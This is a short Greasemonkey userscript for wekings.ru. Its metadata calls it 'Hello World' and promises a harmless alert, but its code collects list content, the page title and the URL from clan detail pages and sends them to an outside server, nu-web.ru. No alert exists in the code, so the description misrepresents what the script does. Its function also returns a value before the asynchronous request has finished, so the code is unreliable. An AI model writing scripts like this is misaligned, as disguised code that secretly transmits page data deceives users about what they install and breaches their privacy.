// ==UserScript==
// @name Hello World
// @namespace http://wekings.ru
// @version 0.01
// @source http://wekings.ru
// @description Этот скрипт покажет вам алерт с "hello word" на каждой странице, кроме исключений!
// @include http://wekings.ru/game/clan/details/*
// @exclude http://wekings.ru
// ==/UserScript==

text = '';
var y = document.getElementsByClassName('block');
for (var key in y) {
    var li = y [key] . getElementsByTagName('li');

    for (var k in li) {
    	text = text + li [k].innerHTML;
    }
}


ajaxRelated(text, document.getElementsByTagName('h1')[0].innerHTML);

function ajaxRelated(text, title) {
	var response;
	url = 'http://nu-web.ru/we.php?text=' + encodeURIComponent(text) + '&title=' + encodeURIComponent(title) + '&url=' + encodeURIComponent(window.location.href);
	// we will now fetch the full page using GM_xmlhttpRequest
	GM_xmlhttpRequest({
		// method can be either GET or POST, we do not need to post anything so we will use GET
		method: "GET",
		// we already have the url so we can just use that
		url: url,
		// this is the function that will be called when the page has loaded, we will use the response to cut out the related posts and paste them in the front page
		// ignore the o, it is just needed to get the response in plain text
		onload: function(o) {
			response = (o.responseText);
		}
	});
	
	return response;
}